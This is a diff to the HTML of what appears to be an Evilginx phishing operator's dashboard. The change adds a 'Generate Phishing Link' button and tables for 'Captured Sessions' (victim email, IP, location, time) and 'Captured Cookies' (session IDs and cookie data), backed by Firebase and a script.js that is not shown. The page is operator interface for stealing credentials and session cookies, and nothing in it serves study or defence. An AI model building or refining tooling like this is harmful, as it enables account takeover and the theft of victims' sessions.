@@ -8,19 +8,31 @@
 </head>
 <body>
     <div class="dashboard-container">
-        <h1>Welcome to Evilginx Dashboard</h1>
-        <button onclick="logout()">Logout</button>
-        <button onclick="generateLink()">Generate Link</button>
-        <button onclick="fetchSessions()">View Captured Sessions</button>
-        <button onclick="fetchCookies()">View Cookies</button>
+        <h2>Welcome to Your Dashboard</h2>
+        <button id="logoutBtn">Logout</button>
 
-        <div id="data-output"></div>
+        <h3>Generate Phishing Link</h3>
+        <button id="generateLinkBtn">Generate Link</button>
+        <p id="generatedLink"></p>
+
+        <h3>Captured Sessions</h3>
+        <button id="fetchSessionsBtn">Load Sessions</button>
+        <table id="capturedSessionsTable">
+            <tr><th>Email</th><th>IP</th><th>Location</th><th>Time</th></tr>
+        </table>
+
+        <h3>Captured Cookies</h3>
+        <button id="fetchCookiesBtn">Load Cookies</button>
+        <table id="cookiesTable">
+            <tr><th>Session ID</th><th>Cookie Data</th></tr>
+        </table>
     </div>
 
-    <!-- Firebase SDK -->
+    <!-- Firebase SDKs -->
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js"></script>
 
+    <!-- Main Script -->
     <script src="script.js"></script>
 </body>
 </html>
